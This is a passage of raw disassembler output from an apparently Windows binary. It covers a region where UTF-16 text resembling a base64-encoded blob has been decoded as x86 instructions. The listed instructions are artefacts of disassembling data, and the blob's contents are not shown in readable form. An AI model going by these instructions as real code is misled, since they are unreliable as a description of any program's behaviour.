  40b344:	00 42 00             	add    %al,0x0(%edx)
  40b347:	65 00 30             	add    %dh,%gs:(%eax)
  40b34a:	00 50 00             	add    %dl,0x0(%eax)
  40b34d:	63 00                	arpl   %eax,(%eax)
  40b34f:	39 00                	cmp    %eax,(%eax)
  40b351:	72 00                	jb     0x40b353
  40b353:	49                   	dec    %ecx
  40b354:	00 4a 00             	add    %cl,0x0(%edx)
  40b357:	6f                   	outsl  %ds:(%esi),(%dx)
  40b358:	00 78 00             	add    %bh,0x0(%eax)
  40b35b:	7a 00                	jp     0x40b35d
  40b35d:	67 00 4f 00          	add    %cl,0x0(%bx)
  40b361:	4e                   	dec    %esi
  40b362:	00 4f 00             	add    %cl,0x0(%edi)
  40b365:	5a                   	pop    %edx
  40b366:	00 47 00             	add    %al,0x0(%edi)
  40b369:	4d                   	dec    %ebp
  40b36a:	00 68 00             	add    %ch,0x0(%eax)
  40b36d:	50                   	push   %eax
  40b36e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b371:	34 00                	xor    $0x0,%al
  40b373:	62 00                	bound  %eax,(%eax)
  40b375:	57                   	push   %edi
  40b376:	00 76 00             	add    %dh,0x0(%esi)
  40b379:	4a                   	dec    %edx
  40b37a:	00 76 00             	add    %dh,0x0(%esi)
  40b37d:	50                   	push   %eax
  40b37e:	00 38                	add    %bh,(%eax)
  40b380:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b383:	49                   	dec    %ecx
  40b384:	00 71 00             	add    %dh,0x0(%ecx)
  40b387:	43                   	inc    %ebx
  40b388:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40b38c:	00 6a 00             	add    %ch,0x0(%edx)
  40b38f:	45                   	inc    %ebp
  40b390:	00 62 00             	add    %ah,0x0(%edx)
  40b393:	70 00                	jo     0x40b395
  40b395:	53                   	push   %ebx
  40b396:	00 50 00             	add    %dl,0x0(%eax)
  40b399:	4b                   	dec    %ebx
  40b39a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b39d:	38 00                	cmp    %al,(%eax)
  40b39f:	58                   	pop    %eax
  40b3a0:	00 6e 00             	add    %ch,0x0(%esi)
  40b3a3:	53                   	push   %ebx
  40b3a4:	00 45 00             	add    %al,0x0(%ebp)
  40b3a7:	73 00                	jae    0x40b3a9
  40b3a9:	75 00                	jne    0x40b3ab
  40b3ab:	30 00                	xor    %al,(%eax)
  40b3ad:	43                   	inc    %ebx
  40b3ae:	00 67 00             	add    %ah,0x0(%edi)
  40b3b1:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40b3b5:	6a 00                	push   $0x0
  40b3b7:	74 00                	je     0x40b3b9
  40b3b9:	4c                   	dec    %esp
  40b3ba:	00 6a 00             	add    %ch,0x0(%edx)
  40b3bd:	68 00 77 00 61       	push   $0x61007700
  40b3c2:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40b3c6:	00 61 00             	add    %ah,0x0(%ecx)
  40b3c9:	50                   	push   %eax
  40b3ca:	00 48 00             	add    %cl,0x0(%eax)
  40b3cd:	6d                   	insl   (%dx),%es:(%edi)
  40b3ce:	00 39                	add    %bh,(%ecx)
  40b3d0:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40b3d4:	00 46 00             	add    %al,0x0(%esi)
  40b3d7:	2b 00                	sub    (%eax),%eax
  40b3d9:	5a                   	pop    %edx
  40b3da:	00 53 00             	add    %dl,0x0(%ebx)
  40b3dd:	34 00                	xor    $0x0,%al
  40b3df:	51                   	push   %ecx
  40b3e0:	00 7a 00             	add    %bh,0x0(%edx)
  40b3e3:	42                   	inc    %edx
  40b3e4:	00 61 00             	add    %ah,0x0(%ecx)
  40b3e7:	58                   	pop    %eax
  40b3e8:	00 56 00             	add    %dl,0x0(%esi)
  40b3eb:	68 00 50 00 63       	push   $0x63005000
  40b3f0:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40b3f4:	00 36                	add    %dh,(%esi)
  40b3f6:	00 66 00             	add    %ah,0x0(%esi)
  40b3f9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3fd:	56                   	push   %esi
  40b3fe:	00 47 00             	add    %al,0x0(%edi)
  40b401:	49                   	dec    %ecx
  40b402:	00 6d 00             	add    %ch,0x0(%ebp)
  40b405:	41                   	inc    %ecx
  40b406:	00 30                	add    %dh,(%eax)
  40b408:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40b40c:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40b410:	00 55 00             	add    %dl,0x0(%ebp)
  40b413:	4e                   	dec    %esi
  40b414:	00 4b 00             	add    %cl,0x0(%ebx)
  40b417:	58                   	pop    %eax
  40b418:	00 36                	add    %dh,(%esi)
  40b41a:	00 77 00             	add    %dh,0x0(%edi)
  40b41d:	76 00                	jbe    0x40b41f
  40b41f:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b423:	61                   	popa
  40b424:	00 55 00             	add    %dl,0x0(%ebp)
  40b427:	71 00                	jno    0x40b429
  40b429:	52                   	push   %edx
  40b42a:	00 77 00             	add    %dh,0x0(%edi)
  40b42d:	63 00                	arpl   %eax,(%eax)
  40b42f:	52                   	push   %edx
  40b430:	00 30                	add    %dh,(%eax)
  40b432:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40b436:	00 2b                	add    %ch,(%ebx)
  40b438:	00 61 00             	add    %ah,0x0(%ecx)
  40b43b:	68 00 4d 00 37       	push   $0x37004d00
  40b440:	00 51 00             	add    %dl,0x0(%ecx)
  40b443:	38 00                	cmp    %al,(%eax)
  40b445:	49                   	dec    %ecx
  40b446:	00 61 00             	add    %ah,0x0(%ecx)
  40b449:	79 00                	jns    0x40b44b
  40b44b:	39 00                	cmp    %eax,(%eax)
  40b44d:	77 00                	ja     0x40b44f
  40b44f:	33 00                	xor    (%eax),%eax
  40b451:	72 00                	jb     0x40b453
  40b453:	35 00 69 00 38       	xor    $0x38006900,%eax
  40b458:	00 32                	add    %dh,(%edx)
  40b45a:	00 4e 00             	add    %cl,0x0(%esi)
  40b45d:	31 00                	xor    %eax,(%eax)
  40b45f:	4b                   	dec    %ebx
  40b460:	00 2b                	add    %ch,(%ebx)
  40b462:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40b466:	00 6f 00             	add    %ch,0x0(%edi)
  40b469:	44                   	inc    %esp
  40b46a:	00 57 00             	add    %dl,0x0(%edi)
  40b46d:	41                   	inc    %ecx
  40b46e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b471:	69 00 45 00 7a 00    	imul   $0x7a0045,(%eax),%eax
  40b477:	79 00                	jns    0x40b479
  40b479:	4a                   	dec    %edx
  40b47a:	00 68 00             	add    %ch,0x0(%eax)
  40b47d:	6b 00 48             	imul   $0x48,(%eax),%eax
  40b480:	00 52 00             	add    %dl,0x0(%edx)
  40b483:	69 00 37 00 69 00    	imul   $0x690037,(%eax),%eax
  40b489:	4c                   	dec    %esp
  40b48a:	00 39                	add    %bh,(%ecx)
  40b48c:	00 45 00             	add    %al,0x0(%ebp)
  40b48f:	38 00                	cmp    %al,(%eax)
  40b491:	49                   	dec    %ecx
  40b492:	00 43 00             	add    %al,0x0(%ebx)
  40b495:	35 00 78 00 50       	xor    $0x50007800,%eax
  40b49a:	00 69 00             	add    %ch,0x0(%ecx)
  40b49d:	73 00                	jae    0x40b49f
  40b49f:	73 00                	jae    0x40b4a1
  40b4a1:	69 00 64 00 52 00    	imul   $0x520064,(%eax),%eax
  40b4a7:	72 00                	jb     0x40b4a9
  40b4a9:	51                   	push   %ecx
  40b4aa:	00 38                	add    %bh,(%eax)
  40b4ac:	00 78 00             	add    %bh,0x0(%eax)
  40b4af:	77 00                	ja     0x40b4b1
  40b4b1:	4f                   	dec    %edi
  40b4b2:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40b4b6:	00 70 00             	add    %dh,0x0(%eax)
  40b4b9:	76 00                	jbe    0x40b4bb
  40b4bb:	5a                   	pop    %edx
  40b4bc:	00 56 00             	add    %dl,0x0(%esi)
  40b4bf:	66 00 39             	data16 add %bh,(%ecx)
  40b4c2:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40b4c6:	00 47 00             	add    %al,0x0(%edi)
  40b4c9:	79 00                	jns    0x40b4cb
  40b4cb:	66 00 31             	data16 add %dh,(%ecx)
  40b4ce:	00 53 00             	add    %dl,0x0(%ebx)
  40b4d1:	70 00                	jo     0x40b4d3
  40b4d3:	43                   	inc    %ebx
  40b4d4:	00 6a 00             	add    %ch,0x0(%edx)
  40b4d7:	74 00                	je     0x40b4d9
  40b4d9:	47                   	inc    %edi
  40b4da:	00 48 00             	add    %cl,0x0(%eax)
  40b4dd:	4d                   	dec    %ebp
  40b4de:	00 65 00             	add    %ah,0x0(%ebp)
  40b4e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4e2:	00 71 00             	add    %dh,0x0(%ecx)
  40b4e5:	69 00 37 00 42 00    	imul   $0x420037,(%eax),%eax
  40b4eb:	47                   	inc    %edi
  40b4ec:	00 4a 00             	add    %cl,0x0(%edx)
  40b4ef:	47                   	inc    %edi
  40b4f0:	00 58 00             	add    %bl,0x0(%eax)
  40b4f3:	42                   	inc    %edx
  40b4f4:	00 6e 00             	add    %ch,0x0(%esi)
  40b4f7:	6a 00                	push   $0x0
  40b4f9:	76 00                	jbe    0x40b4fb
  40b4fb:	6d                   	insl   (%dx),%es:(%edi)
  40b4fc:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40b500:	00 33                	add    %dh,(%ebx)
  40b502:	00 53 00             	add    %dl,0x0(%ebx)
  40b505:	54                   	push   %esp
  40b506:	00 76 00             	add    %dh,0x0(%esi)
  40b509:	72 00                	jb     0x40b50b
  40b50b:	38 00                	cmp    %al,(%eax)
  40b50d:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b511:	68 00 35 00 46       	push   $0x46003500
  40b516:	00 78 00             	add    %bh,0x0(%eax)
  40b519:	31 00                	xor    %eax,(%eax)
  40b51b:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40b51f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b520:	00 72 00             	add    %dh,0x0(%edx)
  40b523:	2b 00                	sub    (%eax),%eax
  40b525:	73 00                	jae    0x40b527
  40b527:	61                   	popa
  40b528:	00 62 00             	add    %ah,0x0(%edx)
  40b52b:	46                   	inc    %esi
  40b52c:	00 49 00             	add    %cl,0x0(%ecx)
  40b52f:	6d                   	insl   (%dx),%es:(%edi)
  40b530:	00 4d 00             	add    %cl,0x0(%ebp)
  40b533:	2f                   	das
  40b534:	00 32                	add    %dh,(%edx)
  40b536:	00 2f                	add    %ch,(%edi)
  40b538:	00 55 00             	add    %dl,0x0(%ebp)
  40b53b:	45                   	inc    %ebp
  40b53c:	00 6a 00             	add    %ch,0x0(%edx)
  40b53f:	57                   	push   %edi
  40b540:	00 67 00             	add    %ah,0x0(%edi)
  40b543:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40b547:	39 00                	cmp    %eax,(%eax)
  40b549:	57                   	push   %edi
  40b54a:	00 5a 00             	add    %bl,0x0(%edx)
  40b54d:	5a                   	pop    %edx
  40b54e:	00 5a 00             	add    %bl,0x0(%edx)
  40b551:	4a                   	dec    %edx
  40b552:	00 63 00             	add    %ah,0x0(%ebx)
  40b555:	79 00                	jns    0x40b557
  40b557:	73 00                	jae    0x40b559
  40b559:	78 00                	js     0x40b55b
  40b55b:	33 00                	xor    (%eax),%eax
  40b55d:	50                   	push   %eax
  40b55e:	00 37                	add    %dh,(%edi)
  40b560:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40b564:	00 4f 00             	add    %cl,0x0(%edi)
  40b567:	4e                   	dec    %esi
  40b568:	00 79 00             	add    %bh,0x0(%ecx)
  40b56b:	48                   	dec    %eax
  40b56c:	00 33                	add    %dh,(%ebx)
  40b56e:	00 7a 00             	add    %bh,0x0(%edx)
  40b571:	6f                   	outsl  %ds:(%esi),(%dx)
  40b572:	00 4a 00             	add    %cl,0x0(%edx)
  40b575:	35 00 44 00 36       	xor    $0x36004400,%eax
  40b57a:	00 53 00             	add    %dl,0x0(%ebx)
  40b57d:	4e                   	dec    %esi
  40b57e:	00 7a 00             	add    %bh,0x0(%edx)
  40b581:	48                   	dec    %eax
  40b582:	00 42 00             	add    %al,0x0(%edx)
  40b585:	2f                   	das
  40b586:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40b58a:	00 72 00             	add    %dh,0x0(%edx)
  40b58d:	43                   	inc    %ebx
  40b58e:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40b592:	00 31                	add    %dh,(%ecx)
  40b594:	00 58 00             	add    %bl,0x0(%eax)
  40b597:	6a 00                	push   $0x0
  40b599:	43                   	inc    %ebx
  40b59a:	00 68 00             	add    %ch,0x0(%eax)
  40b59d:	68 00 38 00 58       	push   $0x58003800
  40b5a2:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40b5a6:	00 37                	add    %dh,(%edi)
  40b5a8:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40b5ac:	00 35 00 6f 00 38    	add    %dh,0x38006f00
  40b5b2:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40b5b6:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40b5ba:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5bd:	4f                   	dec    %edi
  40b5be:	00 2f                	add    %ch,(%edi)
  40b5c0:	00 53 00             	add    %dl,0x0(%ebx)
  40b5c3:	2b 00                	sub    (%eax),%eax
  40b5c5:	48                   	dec    %eax
  40b5c6:	00 33                	add    %dh,(%ebx)
  40b5c8:	00 66 00             	add    %ah,0x0(%esi)
  40b5cb:	58                   	pop    %eax
  40b5cc:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  40b5d0:	00 6f 00             	add    %ch,0x0(%edi)
  40b5d3:	53                   	push   %ebx
  40b5d4:	00 51 00             	add    %dl,0x0(%ecx)
  40b5d7:	2f                   	das
  40b5d8:	00 41 00             	add    %al,0x0(%ecx)
  40b5db:	52                   	push   %edx
  40b5dc:	00 66 00             	add    %ah,0x0(%esi)
  40b5df:	56                   	push   %esi
  40b5e0:	00 32                	add    %dh,(%edx)
  40b5e2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5e5:	74 00                	je     0x40b5e7
  40b5e7:	74 00                	je     0x40b5e9
  40b5e9:	4f                   	dec    %edi
  40b5ea:	00 76 00             	add    %dh,0x0(%esi)
  40b5ed:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40b5f1:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40b5f5:	46                   	inc    %esi
  40b5f6:	00 4f 00             	add    %cl,0x0(%edi)
  40b5f9:	57                   	push   %edi
  40b5fa:	00 51 00             	add    %dl,0x0(%ecx)
  40b5fd:	45                   	inc    %ebp
  40b5fe:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40b602:	00 71 00             	add    %dh,0x0(%ecx)
  40b605:	52                   	push   %edx
  40b606:	00 4b 00             	add    %cl,0x0(%ebx)
  40b609:	4b                   	dec    %ebx
  40b60a:	00 47 00             	add    %al,0x0(%edi)
  40b60d:	5a                   	pop    %edx
  40b60e:	00 77 00             	add    %dh,0x0(%edi)
  40b611:	6e                   	outsb  %ds:(%esi),(%dx)
  40b612:	00 4a 00             	add    %cl,0x0(%edx)
  40b615:	37                   	aaa
  40b616:	00 47 00             	add    %al,0x0(%edi)
  40b619:	32 00                	xor    (%eax),%al
  40b61b:	51                   	push   %ecx
  40b61c:	00 58 00             	add    %bl,0x0(%eax)
  40b61f:	61                   	popa
  40b620:	00 32                	add    %dh,(%edx)
  40b622:	00 35 00 72 00 79    	add    %dh,0x79007200
  40b628:	00 6e 00             	add    %ch,0x0(%esi)
  40b62b:	57                   	push   %edi
  40b62c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b62f:	71 00                	jno    0x40b631
  40b631:	6d                   	insl   (%dx),%es:(%edi)
  40b632:	00 72 00             	add    %dh,0x0(%edx)
  40b635:	4d                   	dec    %ebp
  40b636:	00 31                	add    %dh,(%ecx)
  40b638:	00 79 00             	add    %bh,0x0(%ecx)
  40b63b:	32 00                	xor    (%eax),%al
  40b63d:	6b 00 43             	imul   $0x43,(%eax),%eax
  40b640:	00 70 00             	add    %dh,0x0(%eax)
  40b643:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40b647:	30 00                	xor    %al,(%eax)
  40b649:	4d                   	dec    %ebp
  40b64a:	00 55 00             	add    %dl,0x0(%ebp)
  40b64d:	4f                   	dec    %edi
  40b64e:	00 58 00             	add    %bl,0x0(%eax)
  40b651:	78 00                	js     0x40b653
  40b653:	58                   	pop    %eax
  40b654:	00 2b                	add    %ch,(%ebx)
  40b656:	00 77 00             	add    %dh,0x0(%edi)
  40b659:	69 00 67 00 45 00    	imul   $0x450067,(%eax),%eax
  40b65f:	35 00 71 00 52       	xor    $0x52007100,%eax
  40b664:	00 72 00             	add    %dh,0x0(%edx)
  40b667:	39 00                	cmp    %eax,(%eax)
  40b669:	38 00                	cmp    %al,(%eax)
  40b66b:	37                   	aaa
  40b66c:	00 48 00             	add    %cl,0x0(%eax)
  40b66f:	49                   	dec    %ecx
  40b670:	00 37                	add    %dh,(%edi)
  40b672:	00 31                	add    %dh,(%ecx)
  40b674:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40b678:	00 39                	add    %bh,(%ecx)
  40b67a:	00 52 00             	add    %dl,0x0(%edx)
  40b67d:	59                   	pop    %ecx
  40b67e:	00 69 00             	add    %ch,0x0(%ecx)
  40b681:	6b 00 41             	imul   $0x41,(%eax),%eax
  40b684:	00 70 00             	add    %dh,0x0(%eax)
  40b687:	62 00                	bound  %eax,(%eax)
  40b689:	47                   	inc    %edi
  40b68a:	00 73 00             	add    %dh,0x0(%ebx)
  40b68d:	47                   	inc    %edi
  40b68e:	00 47 00             	add    %al,0x0(%edi)
  40b691:	51                   	push   %ecx
  40b692:	00 75 00             	add    %dh,0x0(%ebp)
  40b695:	54                   	push   %esp
  40b696:	00 4e 00             	add    %cl,0x0(%esi)
  40b699:	6c                   	insb   (%dx),%es:(%edi)
  40b69a:	00 46 00             	add    %al,0x0(%esi)
  40b69d:	39 00                	cmp    %eax,(%eax)
  40b69f:	73 00                	jae    0x40b6a1
  40b6a1:	34 00                	xor    $0x0,%al
  40b6a3:	43                   	inc    %ebx
  40b6a4:	00 31                	add    %dh,(%ecx)
  40b6a6:	00 46 00             	add    %al,0x0(%esi)
  40b6a9:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40b6ad:	4f                   	dec    %edi
  40b6ae:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6b1:	4a                   	dec    %edx
  40b6b2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6b6:	00 78 00             	add    %bh,0x0(%eax)
  40b6b9:	78 00                	js     0x40b6bb
  40b6bb:	51                   	push   %ecx
  40b6bc:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6bf:	54                   	push   %esp
  40b6c0:	00 69 00             	add    %ch,0x0(%ecx)
  40b6c3:	30 00                	xor    %al,(%eax)
  40b6c5:	39 00                	cmp    %eax,(%eax)
  40b6c7:	63 00                	arpl   %eax,(%eax)
  40b6c9:	61                   	popa
  40b6ca:	00 2f                	add    %ch,(%edi)
  40b6cc:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6cf:	59                   	pop    %ecx
  40b6d0:	00 48 00             	add    %cl,0x0(%eax)
  40b6d3:	55                   	push   %ebp
  40b6d4:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6d7:	56                   	push   %esi
  40b6d8:	00 58 00             	add    %bl,0x0(%eax)
  40b6db:	44                   	inc    %esp
  40b6dc:	00 61 00             	add    %ah,0x0(%ecx)
  40b6df:	4c                   	dec    %esp
  40b6e0:	00 66 00             	add    %ah,0x0(%esi)
  40b6e3:	7a 00                	jp     0x40b6e5
  40b6e5:	4f                   	dec    %edi
  40b6e6:	00 70 00             	add    %dh,0x0(%eax)
  40b6e9:	51                   	push   %ecx
  40b6ea:	00 67 00             	add    %ah,0x0(%edi)
  40b6ed:	4b                   	dec    %ebx
  40b6ee:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40b6f2:	00 61 00             	add    %ah,0x0(%ecx)
  40b6f5:	52                   	push   %edx
  40b6f6:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40b6fa:	00 4a 00             	add    %cl,0x0(%edx)
  40b6fd:	58                   	pop    %eax
  40b6fe:	00 48 00             	add    %cl,0x0(%eax)
  40b701:	61                   	popa
  40b702:	00 6b 00             	add    %ch,0x0(%ebx)
  40b705:	59                   	pop    %ecx
  40b706:	00 7a 00             	add    %bh,0x0(%edx)
  40b709:	46                   	inc    %esi
  40b70a:	00 31                	add    %dh,(%ecx)
  40b70c:	00 76 00             	add    %dh,0x0(%esi)
  40b70f:	38 00                	cmp    %al,(%eax)
  40b711:	48                   	dec    %eax
  40b712:	00 30                	add    %dh,(%eax)
  40b714:	00 4d 00             	add    %cl,0x0(%ebp)
  40b717:	4c                   	dec    %esp
  40b718:	00 46 00             	add    %al,0x0(%esi)
  40b71b:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b71f:	76 00                	jbe    0x40b721
  40b721:	53                   	push   %ebx
  40b722:	00 70 00             	add    %dh,0x0(%eax)
  40b725:	58                   	pop    %eax
  40b726:	00 4b 00             	add    %cl,0x0(%ebx)
  40b729:	37                   	aaa
  40b72a:	00 30                	add    %dh,(%eax)
  40b72c:	00 4a 00             	add    %cl,0x0(%edx)
  40b72f:	72 00                	jb     0x40b731
  40b731:	4e                   	dec    %esi
  40b732:	00 42 00             	add    %al,0x0(%edx)
  40b735:	30 00                	xor    %al,(%eax)
  40b737:	6c                   	insb   (%dx),%es:(%edi)
  40b738:	00 31                	add    %dh,(%ecx)
  40b73a:	00 37                	add    %dh,(%edi)
  40b73c:	00 4a 00             	add    %cl,0x0(%edx)
  40b73f:	4e                   	dec    %esi
  40b740:	00 37                	add    %dh,(%edi)
  40b742:	00 53 00             	add    %dl,0x0(%ebx)
  40b745:	30 00                	xor    %al,(%eax)
  40b747:	66 00 35 00 4e 00 53 	data16 add %dh,0x53004e00
  40b74e:	00 69 00             	add    %ch,0x0(%ecx)
  40b751:	5a                   	pop    %edx
  40b752:	00 62 00             	add    %ah,0x0(%edx)
  40b755:	41                   	inc    %ecx
  40b756:	00 66 00             	add    %ah,0x0(%esi)
  40b759:	77 00                	ja     0x40b75b
  40b75b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b75c:	00 73 00             	add    %dh,0x0(%ebx)
  40b75f:	61                   	popa
  40b760:	00 50 00             	add    %dl,0x0(%eax)
  40b763:	69 00 6f 00 73 00    	imul   $0x73006f,(%eax),%eax
  40b769:	56                   	push   %esi
  40b76a:	00 5a 00             	add    %bl,0x0(%edx)
  40b76d:	4a                   	dec    %edx
  40b76e:	00 51 00             	add    %dl,0x0(%ecx)
  40b771:	79 00                	jns    0x40b773
  40b773:	71 00                	jno    0x40b775
  40b775:	54                   	push   %esp
  40b776:	00 6e 00             	add    %ch,0x0(%esi)
  40b779:	53                   	push   %ebx
  40b77a:	00 2b                	add    %ch,(%ebx)
  40b77c:	00 52 00             	add    %dl,0x0(%edx)
  40b77f:	32 00                	xor    (%eax),%al
  40b781:	73 00                	jae    0x40b783
  40b783:	2b 00                	sub    (%eax),%eax
  40b785:	4f                   	dec    %edi
  40b786:	00 6f 00             	add    %ch,0x0(%edi)
  40b789:	63 00                	arpl   %eax,(%eax)
  40b78b:	43                   	inc    %ebx
  40b78c:	00 53 00             	add    %dl,0x0(%ebx)
  40b78f:	30 00                	xor    %al,(%eax)
  40b791:	61                   	popa
  40b792:	00 2b                	add    %ch,(%ebx)
  40b794:	00 6d 00             	add    %ch,0x0(%ebp)
  40b797:	6a 00                	push   $0x0
  40b799:	2b 00                	sub    (%eax),%eax
  40b79b:	6b 00 58             	imul   $0x58,(%eax),%eax
  40b79e:	00 43 00             	add    %al,0x0(%ebx)
  40b7a1:	55                   	push   %ebp
  40b7a2:	00 63 00             	add    %ah,0x0(%ebx)
  40b7a5:	6b 00 43             	imul   $0x43,(%eax),%eax
  40b7a8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b7ab:	6b 00 74             	imul   $0x74,(%eax),%eax
  40b7ae:	00 38                	add    %bh,(%eax)
  40b7b0:	00 53 00             	add    %dl,0x0(%ebx)
  40b7b3:	47                   	inc    %edi
  40b7b4:	00 6d 00             	add    %ch,0x0(%ebp)
  40b7b7:	76 00                	jbe    0x40b7b9
  40b7b9:	42                   	inc    %edx
  40b7ba:	00 32                	add    %dh,(%edx)
  40b7bc:	00 59 00             	add    %bl,0x0(%ecx)
  40b7bf:	50                   	push   %eax
  40b7c0:	00 69 00             	add    %ch,0x0(%ecx)
  40b7c3:	4f                   	dec    %edi
  40b7c4:	00 38                	add    %bh,(%eax)
  40b7c6:	00 69 00             	add    %ch,0x0(%ecx)
  40b7c9:	41                   	inc    %ecx
  40b7ca:	00 62 00             	add    %ah,0x0(%edx)
  40b7cd:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40b7d1:	2f                   	das
  40b7d2:	00 67 00             	add    %ah,0x0(%edi)
  40b7d5:	51                   	push   %ecx
  40b7d6:	00 33                	add    %dh,(%ebx)
  40b7d8:	00 57 00             	add    %dl,0x0(%edi)
  40b7db:	61                   	popa
  40b7dc:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40b7e0:	00 5a 00             	add    %bl,0x0(%edx)
  40b7e3:	6d                   	insl   (%dx),%es:(%edi)
  40b7e4:	00 4f 00             	add    %cl,0x0(%edi)
  40b7e7:	75 00                	jne    0x40b7e9
  40b7e9:	68 00 43 00 34       	push   $0x34004300
  40b7ee:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b7f2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7f5:	51                   	push   %ecx
  40b7f6:	00 66 00             	add    %ah,0x0(%esi)
  40b7f9:	37                   	aaa
  40b7fa:	00 50 00             	add    %dl,0x0(%eax)
  40b7fd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7fe:	00 51 00             	add    %dl,0x0(%ecx)
  40b801:	4e                   	dec    %esi
  40b802:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40b806:	00 37                	add    %dh,(%edi)
  40b808:	00 57 00             	add    %dl,0x0(%edi)
  40b80b:	4a                   	dec    %edx
  40b80c:	00 62 00             	add    %ah,0x0(%edx)
  40b80f:	54                   	push   %esp
  40b810:	00 5a 00             	add    %bl,0x0(%edx)
  40b813:	5a                   	pop    %edx
  40b814:	00 35 00 61 00 4d    	add    %dh,0x4d006100
  40b81a:	00 75 00             	add    %dh,0x0(%ebp)
  40b81d:	74 00                	je     0x40b81f
  40b81f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b820:	00 58 00             	add    %bl,0x0(%eax)
  40b823:	6b 00 61             	imul   $0x61,(%eax),%eax
  40b826:	00 41 00             	add    %al,0x0(%ecx)
  40b829:	5a                   	pop    %edx
  40b82a:	00 4f 00             	add    %cl,0x0(%edi)
  40b82d:	34 00                	xor    $0x0,%al
  40b82f:	30 00                	xor    %al,(%eax)
  40b831:	4d                   	dec    %ebp
  40b832:	00 66 00             	add    %ah,0x0(%esi)
  40b835:	76 00                	jbe    0x40b837
  40b837:	37                   	aaa
  40b838:	00 6f 00             	add    %ch,0x0(%edi)
  40b83b:	51                   	push   %ecx
  40b83c:	00 48 00             	add    %cl,0x0(%eax)
  40b83f:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b843:	77 00                	ja     0x40b845
  40b845:	51                   	push   %ecx
  40b846:	00 42 00             	add    %al,0x0(%edx)
  40b849:	42                   	inc    %edx
  40b84a:	00 2f                	add    %ch,(%edi)
  40b84c:	00 31                	add    %dh,(%ecx)
  40b84e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b851:	78 00                	js     0x40b853
  40b853:	49                   	dec    %ecx
  40b854:	00 4a 00             	add    %cl,0x0(%edx)
  40b857:	2b 00                	sub    (%eax),%eax
  40b859:	2b 00                	sub    (%eax),%eax
  40b85b:	35 00 48 00 6f       	xor    $0x6f004800,%eax
  40b860:	00 6f 00             	add    %ch,0x0(%edi)
  40b863:	6d                   	insl   (%dx),%es:(%edi)
  40b864:	00 33                	add    %dh,(%ebx)
  40b866:	00 66 00             	add    %ah,0x0(%esi)
  40b869:	50                   	push   %eax
  40b86a:	00 32                	add    %dh,(%edx)
  40b86c:	00 51 00             	add    %dl,0x0(%ecx)
  40b86f:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40b873:	68 00 7a 00 4a       	push   $0x4a007a00
  40b878:	00 36                	add    %dh,(%esi)
  40b87a:	00 42 00             	add    %al,0x0(%edx)
  40b87d:	68 00 51 00 38       	push   $0x38005100
  40b882:	00 30                	add    %dh,(%eax)
  40b884:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40b888:	00 6b 00             	add    %ch,0x0(%ebx)
  40b88b:	53                   	push   %ebx
  40b88c:	00 69 00             	add    %ch,0x0(%ecx)
  40b88f:	2f                   	das
  40b890:	00 62 00             	add    %ah,0x0(%edx)
  40b893:	5a                   	pop    %edx
  40b894:	00 78 00             	add    %bh,0x0(%eax)
  40b897:	74 00                	je     0x40b899
